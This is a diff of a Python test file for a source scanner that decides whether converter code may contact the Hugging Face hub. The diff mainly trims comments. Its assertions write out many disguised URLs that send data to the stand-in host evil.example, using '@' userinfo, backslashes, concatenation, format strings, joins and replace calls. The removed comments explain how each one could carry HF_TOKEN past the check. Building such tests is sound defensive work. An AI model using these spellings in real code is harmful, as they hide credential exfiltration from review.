-    remote-code loader that happens to mention the hub is untouched.
-    """
+    """Only the env-harvest combination is narrowed."""
     scan_converter_source = _load(
         "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
     ).scan_converter_source
@@ -4958,11 +4744,6 @@ def test_the_hub_allowance_reads_the_real_hostname():
     """Reads throughout, deliberately: the allowance refuses a write to the hub
     outright, so a POST here would make every case pass without the hostname
     check doing anything.
-
-    `https://huggingface.co:443@evil.example/collect` sends the request to
-    evil.example: everything before the @ is user information. Taking the
-    authority up to the first colon read it as huggingface.co, which turned the
-    allowance into a way to post HF_TOKEN anywhere and have this say nothing.
     """
     scan_converter_source = _load(
         "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
@@ -5000,9 +4781,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
 
     # A scheme requests accepts is a scheme this has to read. requests
     # normalizes HTTPS://, so a lowercase-only pattern let the destination be
-    # spelled past the check. It has to be tested BESIDE a hub literal: on its
-    # own the file names no host this can see, which is not suppressed anyway,
-    # so the case passes whether or not the scheme is read.
+    # spelled past the check.
     def _beside_the_hub(destination):
         return [
             f.check for f in scan_converter_source(
@@ -5028,17 +4807,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # destination in a bytes literal was invisible beside a str hub literal.
     assert _beside_the_hub('b"https://evil.example/collect"')
 
-    # A backslash is part of the URL, not a place to stop reading it. Both
-    # urlsplit and httpx resolve this to evil.example, and httpx is a sink the
-    # network rule already recognises, so stopping at the backslash recorded
-    # only the hub and suppressed the finding.
-    # Whatever is between the scheme and the first URL delimiter has to LOOK like
-    # a hostname. Four review rounds found five spellings that ended the match
-    # early and left only the hub recorded, so the check is no longer a list of
-    # characters to stop at: user information before an @, an uppercase scheme, a
-    # bytes literal, a backslash and a space each stay inside the authority now,
-    # where they fail to look like a host and the allowance is refused. urlsplit
-    # and httpx both resolve every one of these to evil.example.
+    # A backslash is part of the URL, not a place to stop reading it.
     for separator in (chr(92), " ", chr(9), chr(10), "%20"):
         assert _beside_the_hub(
             '"https://huggingface.co' + separator + '@evil.example/collect"'
@@ -5047,9 +4816,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # A destination spelled across `+` or `%` is still spelled out in full, and
     # ast.parse does not fold either, so each operand named no host and a hub
     # literal elsewhere in the file granted the allowance over a URL that reads
-    # as evil.example to every client. Folding an operand that is not a literal
-    # is not possible, which leaves that case where the dynamic destinations
-    # already are.
+    # as evil.example to every client.
     assert _beside_the_hub('"https://" + "evil.example/collect"')
     assert _beside_the_hub('"htt" + "ps://evil.example/collect"')
     assert _beside_the_hub('"https://" + "evil.example" + "/collect"')
@@ -5057,24 +4824,18 @@ def test_the_hub_allowance_reads_the_real_hostname():
     assert _beside_the_hub('"%s://%s/collect" % ("https", "evil.example")')
     assert _beside_the_hub('"https://%s/collect" % ("evil.example",)')
 
-    # The hub spelled the same way is still the hub. A fold has to REPLACE its
-    # operands: reading "https://hugging" as a host called `hugging` beside the
-    # folded hub refuses a file that never names anything else, which is the
-    # false positive this narrowing exists to remove.
+    # The hub spelled the same way is still the hub.
     assert _beside_the_hub('"https://huggingface.co" + "/api/models"') == []
     assert _beside_the_hub('"https://hugging" + "face.co/api/models"') == []
     assert _beside_the_hub('"%s/api/models" % ("https://huggingface.co",)') == []
 
-    # Only %s, %r and %% are folded: "%2000000000d" % 1 is a two gigabyte string,
-    # and scanning a file is not a reason to allocate one.
+    # Only %s, %r and %% are folded:
     assert _beside_the_hub('"%2000000000d" % 1') == []
 
     # An f-string arrives here already split, and an empty interpolation is a
     # no-op at runtime: f"https://{''}evil.example/log" fetches evil.example
     # while leaving the scheme in one constant piece and the whole hostname, in
-    # plain sight, in another that no longer has a scheme in front of it. A hole
-    # this cannot read is not a licence to read the text on either side of it as
-    # though the hole were not there.
+    # plain sight, in another that no longer has a scheme in front of it.
     assert _beside_the_hub("f\"https://{''}evil.example/collect\"")
     assert _beside_the_hub('f"https://{SEP}evil.example/collect"')
     assert _beside_the_hub('f"https://{org}.huggingface.co/api/models"')
@@ -5090,8 +4851,6 @@ def test_the_hub_allowance_reads_the_real_hostname():
 
     # A scheme with no authority at all means the destination is assembled
     # somewhere this cannot follow, which every splitting trick was built on.
-    # Upstream's bare "https://" literals are in metadata.py, which never
-    # reaches this allowance: on master only gguf-py/gguf/utility.py does.
     assert _beside_the_hub('"".join(("https://", "evil.example")) + "/collect"')
     assert _beside_the_hub('"{}evil.example/collect".format("https://")')
     assert _beside_the_hub('"https://"')
@@ -5099,9 +4858,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # A literal reaches the request as written only if nothing reshapes it, and
     # BASE.replace("huggingface.co", "evil.example") fetches evil.example while
     # every literal in the file is either the hub or a bare name with no scheme
-    # in front of it. The secret rides out in the query string, so there is no
-    # write to refuse either. Reading is the whole point of the allowance, which
-    # is why this has to be caught at the destination rather than at the verb.
+    # in front of it.
     def _reshaped(body):
         return [
             f.check for f in scan_converter_source(
@@ -5125,16 +4882,11 @@ def test_the_hub_allowance_reads_the_real_hostname():
         'url = (u := BASE).replace("huggingface.co", "evil.example")\n'
     )
     # str.join was the last construction the folding did not model, and it beat
-    # both of the checks above: "".join(("htt", "ps://ev", "il.exa", "mple/c"))
-    # spells out a URL whose scheme appears in no single piece, so nothing
-    # matched a scheme and the bare-scheme refusal never triggered either. A
-    # piece that cannot be read is a hole, as in an f-string, so a join is never
-    # read as the pieces around the part this could not see.
+    # both of the checks above:
     assert _beside_the_hub('"".join(("htt", "ps://ev", "il.exa", "mple/collect"))')
     # str.format splits a scheme the same way, and upstream spells plenty of
-    # strings with it, 15 literal receivers across the real modules, so this one
-    # is FOLDED rather than refused. A field carrying a conversion or a format
-    # spec is left alone: "{:>1000000000}".format("x") is a gigabyte.
+    # strings with it, 15 literal receivers across the real modules, so this
+    # one is FOLDED rather than refused.
     assert _beside_the_hub('"{}://{}".format("https", "evil.example/collect")')
     assert _beside_the_hub('"{s}://{h}/c".format(s = "https", h = "evil.example")')
     assert _beside_the_hub(
@@ -5142,28 +4894,18 @@ def test_the_hub_allowance_reads_the_real_hostname():
     )
     assert _beside_the_hub('"{}://{}".format("https", "huggingface.co")') == []
     assert _beside_the_hub('"".join([x, "htt", "ps://evil.example/collect"])')
-    # The hole has to stay in the text. Dropping it leaves "https://huggingface.co",
-    # which is the hub, while at runtime SUFFIX = "@evil.example/collect" makes the
-    # request go to evil.example, everything before the @ being user information.
+    # The hole has to stay in the text.
     assert _beside_the_hub('"".join(["https://huggingface.co", SUFFIX])')
     assert _beside_the_hub('"/".join(["https:/", "evil.example", "collect"])')
     # And the same seam in the other direction: a carrier put through a join
-    # came out the far side untainted, so reshaping the result was not a reshape
-    # of anything. The receiver of the reshape is the join itself, with no name
-    # in between to have been tainted.
+    # came out the far side untainted, so reshaping the result was not a
+    # reshape of anything.
     assert _reshaped('url = "".join([BASE, "/x"]).replace("huggingface.co", "evil.example")\n')
     # += mutates the carrier in place and the walk still sees only the hub it
     # started as, while at runtime the authority resolves to evil.example.
     assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
     # Appending to a carrier can rewrite the authority without touching the
-    # literal: BASE + "@evil.example/collect" is fetched from evil.example,
-    # everything before the @ being user information. Appending a PATH is what
-    # upstream does, so text that begins with a URL delimiter is fine and
-    # anything else, text this cannot read included, is not.
-    # A function rewrites a URL as well as a method does: urljoin(BASE,
-    # "//evil.example/collect") resolves to evil.example. Only the builders,
-    # since upstream reads its URL with urlparse and passes it to its own
-    # helpers, and reading one is not rebuilding it.
+    # literal:
     assert _reshaped('url = urljoin(BASE, "//evil.example/collect")\n')
     assert _reshaped(
         'import urllib.parse\nurl = urllib.parse.urljoin(BASE, "//evil.example/c")\n'
@@ -5208,27 +4950,20 @@ def test_the_hub_allowance_reads_the_real_hostname():
         'A, url = ("https://huggingface.co/api", "https://huggingface.co")\n'
     ) == []
 
-    # An element that folds to "" is a fold, not a hole: `or UNKNOWN_PIECE`
-    # turned it into the sentinel and stuck it to the hostname, so a benign
-    # download became a CRITICAL.
+    # An element that folds to "" is a fold, not a hole:
     assert _beside_the_hub('"".join(("https://huggingface.co", ""))') == []
     assert _reshaped('url = f"{BASE}"[:8] + "evil.example"\n')
     # Joining the hub with its own path is still the hub.
     assert _beside_the_hub('"/".join(("https://huggingface.co", "api", "models"))') == []
     assert _beside_the_hub('"".join(("https://", "huggingface.co", "/api"))') == []
 
-    # Settling which names carry a URL is bounded. Each pass walks the whole
-    # tree and a chain of assignments that each carry the previous one needs a
-    # pass apiece, so an unbounded loop spent 25 seconds on 2000 of them, on the
-    # path that decides whether an export may run. Unsettled means refused, not
-    # spun on.
+    # Settling which names carry a URL is bounded.
     chain = "".join(
         f'v{i} = f"{{v{i - 1}}}/x"\n' for i in range(1500)
     ).replace("{v-1}", "{BASE}")
     # The verdict carries this one: a fixpoint that does not settle inside its
     # passes refuses, so an unbounded walk shows up as a different answer and
-    # not merely as a slow one. It was a ten second deadline, which failed on a
-    # loaded worker while the scanner was behaving.
+    # not merely as a slow one.
     assert _reshaped(chain + 'url = v1499.replace("huggingface.co", "evil.example")\n')
 
     # The chain itself is what forces the passes, so the assignments are
@@ -5240,15 +4975,12 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # Generous on purpose: this is the one check here with nothing but time to
     # measure, and it exists to catch a return to walking the tree per pass,
     # which took about a minute on this input rather than the two seconds it
-    # takes now. A deadline near the real cost fails on a loaded worker.
+    # takes now.
     started = time.perf_counter()
     _reshaped(long_chain)
     assert time.perf_counter() - started < 60
 
-    # What comes BACK from the hub is not a URL. Upstream writes exactly this,
-    # and carrying the taint through the call refused the file the allowance
-    # exists for: response.raise_for_status(), index_json["weight_map"],
-    # raw_data[:8] are all ordinary parsing of a download.
+    # What comes BACK from the hub is not a URL.
     assert scan_converter_source(
         'import os\n'
         'import requests\n'
